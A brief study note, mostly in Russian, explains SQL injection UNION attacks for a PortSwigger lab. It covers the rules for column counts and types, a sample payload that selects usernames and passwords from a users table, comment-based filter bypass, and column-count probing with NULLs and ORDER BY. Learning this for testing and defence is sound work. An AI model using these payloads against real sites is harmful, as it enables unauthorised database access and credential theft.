SQL injection Union attack

SQL UNION-атака — это тип SQL-инъекции, при которой злоумышленник добавляет в запрос оператор UNION, чтобы объединить результаты исходного запроса с результатами другого, управляемого им запроса. Это позволяет получить данные из других таблиц БД.

Правила использования UNION в SQL-инъекции:
Одинаковое количество столбцов — у обоих запросов (исходного и инъецированного) должно быть одинаковое число столбцов.

Совместимые типы данных — типы данных соответствующих столбцов должны совпадать или быть совместимыми.

UNION SELECT — ключевая конструкция, используемая для атаки (например: UNION SELECT username, password FROM users).

Часто требует обхода фильтров — например, добавление комментария (--) после инъекции.

way1

SELECT example1 FROM table1 UNION SELECT NULL
-error --> incorrect number of columns
SELECT example1 FROM table1 UNION SELECT NULL, NULL
-error --> incorrect number of columns
SELECT example1 FROM table1 UNION SELECT NULL, NULL, NULL
-200 response code --> correct number of columns

way2

SELECT a,b FROM table1 order by 1/2/3
' order by 1/2/3   payload

Ссылка на лаб:
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle